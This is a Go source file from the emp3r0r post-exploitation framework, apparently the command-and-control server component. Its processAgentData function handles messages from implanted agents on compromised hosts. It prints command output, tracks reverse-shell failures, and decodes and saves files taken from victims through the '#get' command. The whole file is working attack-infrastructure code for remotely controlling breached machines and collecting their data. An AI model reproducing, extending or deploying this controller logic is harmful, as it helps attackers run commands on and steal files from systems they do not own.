package cc

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent"
)

// processAgentData deal with data from agent side
func processAgentData(data *agent.MsgTunData) {
	payloadSplit := strings.Split(data.Payload, agent.OpSep)
	op := payloadSplit[0]

	agent := GetTargetFromTag(data.Tag)
	contrlIf := Targets[agent]

	switch op {

	// cmd output from agent
	case "cmd":
		cmd := payloadSplit[1]
		out := strings.Join(payloadSplit[2:], " ")
		outLines := strings.Split(out, "\n")

		// if cmd is `bash`, our shell is likey broken
		if strings.HasPrefix(cmd, "bash") {
			shellToken := strings.Split(cmd, " ")[1]
			RShellStatus[shellToken] = fmt.Errorf("Reverse shell error: %v", out)
		}

		// optimize output
		if len(outLines) > 20 {
			t := time.Now()
			logname := fmt.Sprintf("%scmd-%d-%02d-%02dT%02d:%02d:%02d.log",
				Temp,
				t.Year(), t.Month(), t.Day(),
				t.Hour(), t.Minute(), t.Second())

			CliPrintInfo("Output will be displayed in new window")
			err := ioutil.WriteFile(logname, []byte(out), 0600)
			if err != nil {
				CliPrintWarning(err.Error())
			}

			viewCmd := fmt.Sprintf(`less -f -r %s`,
				logname)

			// split window vertically
			if err = TmuxSplit("v", viewCmd); err == nil {
				CliPrintSuccess("View result in new window (press q to quit)")
				return
			}
			CliPrintError("Failed to opent tmux window: %v", err)
		}

		log.Printf("\n[%d] %s:\n%s\n", contrlIf.Index, cmd, out)

	// save file from #get
	case "FILE":
		filepath := payloadSplit[1]

		// we only need the filename
		filename := FileBaseName(filepath)

		b64filedata := payloadSplit[2]
		filedata, err := base64.StdEncoding.DecodeString(b64filedata)
		if err != nil {
			CliPrintError("processAgentData failed to decode file data: ", err)
			return
		}

		// save to /tmp for security
		if _, err := os.Stat(FileGetDir); os.IsNotExist(err) {
			err = os.MkdirAll(FileGetDir, 0700)
			if err != nil {
				CliPrintError("mkdir -p /tmp/emp3r0r/file-get: ", err)
				return
			}
		}
		err = ioutil.WriteFile(FileGetDir+filename, filedata, 0600)
		if err != nil {
			CliPrintError("processAgentData failed to save file: ", err)
			return
		}

	default:
	}
}
